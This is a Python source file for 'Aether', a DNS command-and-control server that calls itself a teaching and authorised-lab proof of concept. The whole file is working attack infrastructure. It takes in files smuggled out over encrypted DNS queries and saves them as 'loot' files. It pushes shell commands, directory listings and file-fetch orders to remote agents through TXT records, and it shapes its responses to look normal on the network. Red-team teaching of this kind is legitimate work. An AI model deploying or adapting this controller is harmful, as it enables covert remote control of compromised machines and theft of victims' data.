#!/usr/bin/env python3
"""
aether_server.py — Authoritative DNS C2 controller (teaching / authorised-lab PoC).

AES-256-GCM + zlib payloads in base32 DNS labels (str-/chk-/end- stream),
selective-repeat R### retries, PULL+TXT command delivery, menu off the recv path.
"""

from __future__ import annotations

import argparse
import atexit
import base64
import os
import socket
import subprocess
import sys
import threading
import time
import zlib

from Cryptodome.Cipher import AES

DEMO_KEY = b"AetherFrameworkSecureKey2026!!!!"  # 32 bytes; --demo-key only

BIND_IP = "0.0.0.0"
PORT = 53
ZONE_DOMAIN = "aether.internal"
CRYPTO_KEY: bytes = b""

chunks: dict = {}
cur_file = ""
expected_max_seq = 0
pending_cmd = None  # full string, e.g. "RUN|whoami"
stream_busy = False
state_lock = threading.Lock()
sock_global = None
resolved_stopped = False


def resolve_key(args) -> bytes:
    """32-byte AES key from --demo-key, --key-hex, or env AETHER_KEY (64 hex chars)."""
    if args.demo_key:
        print("!" * 60)
        print("[!] DEMO KEY IN USE — teaching only. Do not use on a real engagement.")
        print("!" * 60)
        return DEMO_KEY

    hex_str = args.key_hex or os.environ.get("AETHER_KEY", "")
    if not hex_str:
        sys.exit(
            "[-] No crypto key. Set AETHER_KEY (64 hex chars = 32 bytes), "
            "pass --key-hex, or use --demo-key for lab demos."
        )
    hex_str = hex_str.strip().lower().replace("0x", "")
    if len(hex_str) != 64:
        sys.exit("[-] Key must be exactly 64 hex characters (32 raw bytes).")
    try:
        return bytes.fromhex(hex_str)
    except ValueError:
        sys.exit("[-] Key is not valid hex.")


def toggle_resolved(action: str) -> None:
    global resolved_stopped
    try:
        subprocess.run(
            ["systemctl", action, "systemd-resolved"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        resolved_stopped = action == "stop"
        print(f"[*] systemd-resolved {action}ed.")
    except Exception as e:
        print(f"[-] Warning: could not {action} systemd-resolved: {e}")


def restore_resolved() -> None:
    if resolved_stopped:
        toggle_resolved("start")


def shutdown_sequence() -> None:
    print("\n[*] Restoring systemd-resolved and exiting...")
    global sock_global
    if sock_global:
        try:
            sock_global.close()
        except Exception:
            pass
    restore_resolved()
    print("[+] Done.")
    os._exit(0)


def decrypt_payload(b32_ciphertext: str):
    """Decrypt base32 subdomain payload: [IV:12][TAG:16][ciphertext] → zlib → bytes."""
    try:
        missing = len(b32_ciphertext) % 8
        if missing:
            b32_ciphertext += "=" * (8 - missing)
        raw = base64.b32decode(b32_ciphertext.upper().encode())
        iv, tag, ciphertext = raw[:12], raw[12:28], raw[28:]
        cipher = AES.new(CRYPTO_KEY, AES.MODE_GCM, nonce=iv)
        return zlib.decompress(cipher.decrypt_and_verify(ciphertext, tag))
    except Exception as e:
        print(f"\n[-] Decrypt/verify failed: {e}")
        return None


def _qname_end(query_data: bytes) -> int:
    idx = 12
    while idx < len(query_data):
        length = query_data[idx]
        if length == 0:
            return idx + 1
        if length & 0xC0:
            return idx + 2
        idx += 1 + length
    return len(query_data)


def build_a_response(query_data: bytes, four_bytes) -> bytes:
    """A answer; TTL=60 (short, normal-looking; uniqueness comes from QNAMEs)."""
    payload = four_bytes.encode() if isinstance(four_bytes, str) else four_bytes
    payload = payload.ljust(4, b"\x00")[:4]
    tid = query_data[:2]
    flags = b"\x81\x80"
    counts = b"\x00\x01\x00\x01\x00\x00\x00\x00"
    qend = _qname_end(query_data)
    question = query_data[12 : qend + 4]
    answer = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + payload  # TTL 60
    return tid + flags + counts + question + answer


def build_txt_response(query_data: bytes, text: str) -> bytes:
    """TXT answer; TTL=60 (short, normal-looking; uniqueness comes from QNAMEs)."""
    tid = query_data[:2]
    flags = b"\x81\x80"
    counts = b"\x00\x01\x00\x01\x00\x00\x00\x00"
    qend = _qname_end(query_data)
    question = query_data[12 : qend + 4]
    raw = text.encode("utf-8", errors="ignore")
    if len(raw) > 200:
        raw = raw[:200]
    rdata = bytes([len(raw)]) + raw
    answer = (
        b"\xc0\x0c"
        + b"\x00\x10"
        + b"\x00\x01"
        + b"\x00\x00\x00\x3c"  # TTL 60
        + len(rdata).to_bytes(2, "big")
        + rdata
    )
    return tid + flags + counts + question + answer


def parse_qname(data: bytes) -> str:
    idx = 12
    labels = []
    while idx < len(data):
        length = data[idx]
        if length == 0:
            break
        if length & 0xC0:
            break
        labels.append(data[idx + 1 : idx + 1 + length].decode("ascii", errors="ignore"))
        idx += 1 + length
    return ".".join(labels).lower()


def background_dns_listener() -> None:
    global chunks, cur_file, expected_max_seq, pending_cmd, stream_busy, sock_global

    while True:
        try:
            data, addr = sock_global.recvfrom(2048)
            if len(data) < 12:
                continue
            full_query = parse_qname(data)
            if ZONE_DOMAIN not in full_query:
                continue
            prefix = full_query.split("." + ZONE_DOMAIN, 1)[0]

            if prefix.startswith("str-"):
                parts = prefix.split("-", 2)
                if len(parts) < 3:
                    sock_global.sendto(build_a_response(data, "ERR "), addr)
                    continue
                _, max_seq_str, filename_str = parts
                with state_lock:
                    expected_max_seq = int(max_seq_str)
                    cur_file = filename_str.replace("__", ".")
                    chunks = {}
                    stream_busy = True
                print(f"\n[*] Stream start: {cur_file} ({expected_max_seq} frames) from {addr[0]}")
                sock_global.sendto(build_a_response(data, "ACK "), addr)

            elif prefix.startswith("chk-"):
                try:
                    _, seq_str, b32_data = prefix.split("-", 2)
                    with state_lock:
                        chunks[int(seq_str)] = b32_data
                    sys.stdout.write(".")
                    sys.stdout.flush()
                except Exception:
                    pass
                sock_global.sendto(build_a_response(data, "ACK "), addr)

            elif prefix.startswith("end-"):
                with state_lock:
                    missing = [i for i in range(expected_max_seq) if i not in chunks]
                    filename = cur_file
                    max_seq = expected_max_seq
                    snapshot = dict(chunks)

                if missing:
                    nxt = missing[0]
                    print(f"\n[!] Missing frame {nxt}; asking RETRY")
                    sock_global.sendto(build_a_response(data, f"R{nxt}"[:4].ljust(4)), addr)
                    continue

                print("\n[+] Stream complete; decrypting...")
                try:
                    full_b32 = "".join(snapshot[i] for i in range(max_seq))
                    original = decrypt_payload(full_b32)
                    if original is not None:
                        if filename in ("ls_output.txt", "command_log.txt"):
                            print(f"\n[Agent output]:\n\n{original.decode('utf-8', errors='ignore')}\n")
                        else:
                            out_name = f"loot_{filename}"
                            with open(out_name, "wb") as f:
                                f.write(original)
                            print(f"\n[+] Wrote '{out_name}' ({len(original)} bytes)")
                except Exception as e:
                    print(f"[-] Reassembly failed: {e}")

                with state_lock:
                    pending_cmd = None
                    stream_busy = False
                    chunks = {}
                    cur_file = ""
                    expected_max_seq = 0
                sock_global.sendto(build_a_response(data, "DONE"), addr)

            elif prefix == "pull" or prefix.startswith("pull."):
                with state_lock:
                    cmd = pending_cmd
                if cmd:
                    sock_global.sendto(build_txt_response(data, cmd), addr)
                else:
                    sock_global.sendto(build_txt_response(data, ""), addr)

            else:
                # beacon / poll: tell agent whether to PULL full command via TXT
                with state_lock:
                    has_cmd = pending_cmd is not None and not stream_busy
                if has_cmd:
                    sock_global.sendto(build_a_response(data, "PULL"), addr)
                else:
                    sock_global.sendto(build_a_response(data, "IDLE"), addr)

        except Exception:
            continue


def parse_args():
    ap = argparse.ArgumentParser(
        description="Aether DNS C2 controller — authorised lab / coursework only."
    )
    ap.add_argument("--bind", default="0.0.0.0", help="Bind address (default 0.0.0.0)")
    ap.add_argument("--port", type=int, default=53, help="UDP port (default 53)")
    ap.add_argument(
        "--domain",
        default="aether.internal",
        help="Zone domain (default aether.internal)",
    )
    key = ap.add_mutually_exclusive_group()
    key.add_argument(
        "--key-hex",
        default=None,
        help="32-byte AES key as 64 hex chars (or set AETHER_KEY)",
    )
    key.add_argument(
        "--demo-key",
        action="store_true",
        help="Use the built-in teaching key (prints a loud warning)",
    )
    return ap.parse_args()


def main() -> None:
    global BIND_IP, PORT, ZONE_DOMAIN, CRYPTO_KEY, pending_cmd, sock_global, stream_busy

    args = parse_args()
    if os.geteuid() != 0:
        sys.exit("[-] Needs root (sudo) to bind :53 and manage systemd-resolved.")

    CRYPTO_KEY = resolve_key(args)
    BIND_IP = args.bind
    PORT = args.port
    ZONE_DOMAIN = args.domain.lower().strip(".")

    if PORT == 53:
        toggle_resolved("stop")
        atexit.register(restore_resolved)

    sock_global = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock_global.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock_global.bind((BIND_IP, PORT))
    except OSError as e:
        print(f"[-] Bind {BIND_IP}:{PORT} failed: {e}")
        shutdown_sequence()

    threading.Thread(target=background_dns_listener, daemon=True).start()
    print(f"[+] Aether DNS listening on {BIND_IP}:{PORT}, zone {ZONE_DOMAIN}")

    while True:
        try:
            with state_lock:
                busy = stream_busy
                waiting = pending_cmd is not None
            if waiting or busy:
                time.sleep(0.3)
                continue

            print("\n=== Aether DNS lab menu ===")
            print("1: List Directory | 2: Run Command | 3: Fetch File | 4: Exit & Restore")
            opt = input("> ").strip()
            if opt == "4":
                shutdown_sequence()
            if opt not in ("1", "2", "3"):
                continue
            arg = input("Parameter/path: ").strip()
            if opt == "1":
                cmd = f"LS|{arg or '.'}"
            elif opt == "2":
                if not arg:
                    print("[-] Need a command.")
                    continue
                cmd = f"RUN|{arg}"
            else:
                if not arg:
                    print("[-] Need a path.")
                    continue
                cmd = f"SEND|{arg}"

            with state_lock:
                pending_cmd = cmd
            print(f"[+] Queued for next agent beacon: {cmd}")
        except (KeyboardInterrupt, SystemExit):
            shutdown_sequence()


if __name__ == "__main__":
    main()
